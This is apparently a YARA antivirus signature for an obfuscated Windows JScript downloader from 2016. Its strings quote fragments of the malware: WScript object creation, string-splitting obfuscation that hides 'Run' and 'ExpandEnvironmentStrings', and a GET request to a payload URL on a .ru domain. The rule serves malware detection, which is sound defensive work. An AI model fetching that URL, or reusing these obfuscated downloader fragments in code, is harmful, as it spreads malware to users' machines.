rule sig_20160428_0cf8386ac169c90208b9c9406f147886 {
  meta:
    description = "datamaliciousorder - file 20160428_0cf8386ac169c90208b9c9406f147886.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e04cc655e3f88cc325b8c1755eb34c39d112361459b58156735cb38dddd1ab6a"

  strings:
    $s1  = "function FlvQqxUyjRftLikZpmKnm(NmfJjwIztBkjFmqLodQsx){AsjOxqQspRsyUvsFnlUnz[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function LftVlrMieTzxMitFxeUgn() {return AsjOxqQspRsyUvsFnlUnz[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s3  = "function FlvQqxUyjRftLikZpmKnm(NmfJjwIztBkjFmqLodQsx){AsjOxqQspRsyUvsFnlUnz[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "var AsjOxqQspRsyUvsFnlUnz = function QpjGmtQyeTucWcjQfzAxz() {return JsfTtoPpcRjlYrzWqtMmo[CkwQmhCenEevTwbAlbDsu](\"WScript\"+\"" ascii
    $s5  = "return DgjHqzCcpWswYzkKlzQiv - NixQypItxDssSjnOohOjt;};" fullword ascii
    $s6  = "function ZdaHmsWarGghUwpRsbQcd(DgjHqzCcpWswYzkKlzQiv, NixQypItxDssSjnOohOjt){AzpKncEmlJknZzyJmxScg = AzpKncEmlJknZzyJmxScg * 1; " ascii
    $s7  = "KvmLmdHjnYxzCdoSvnNib[WmfLmzLssIymTqaXsmTxj](\"G\" + \"ET\", \"http://3dphoto-rotate.ru/h4ydjs\", false);" fullword ascii
    $s8  = "var AsjOxqQspRsyUvsFnlUnz = function QpjGmtQyeTucWcjQfzAxz() {return JsfTtoPpcRjlYrzWqtMmo[CkwQmhCenEevTwbAlbDsu](\"WScript\"+\"" ascii
    $s9  = "var JsfTtoPpcRjlYrzWqtMmo = this[\"WScript\"];" fullword ascii
    $s10 = "function LftVlrMieTzxMitFxeUgn() {return AsjOxqQspRsyUvsFnlUnz[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function QwaRbbOxjRxuOnnTbzFly(){return RyyYcmIziTwmOrxHruXjo + \"\";};" fullword ascii
    $s12 = "function ZdaHmsWarGghUwpRsbQcd(DgjHqzCcpWswYzkKlzQiv, NixQypItxDssSjnOohOjt){AzpKncEmlJknZzyJmxScg = AzpKncEmlJknZzyJmxScg * 1; " ascii
    $s13 = "if (KvmLmdHjnYxzCdoSvnNib[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s14 = "function WthLbwJxcNsxXdyXbhDed(FdgTjsDskDalSqgQhjZvv) {var WwdIcsXvnRluPfiFchPfs = (1, 2, 3, 4, 5, FdgTjsDskDalSqgQhjZvv); retur" ascii
    $s15 = "var XhcRrcJniZgdTkgGbnYyp = new this[\"D\"+\"ate\"]();" fullword ascii
    $s16 = "XamRnbMvrThcVfwWpcJke = true;" fullword ascii
    $s17 = "UbzAbiMrpEpjQoaXgpCii = true; " fullword ascii
    $s18 = "function UopNwdKzbVopMgpRwtKyu()" fullword ascii
    $s19 = "var XamRnbMvrThcVfwWpcJke = false;" fullword ascii
    $s20 = "var UbzAbiMrpEpjQoaXgpCii = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}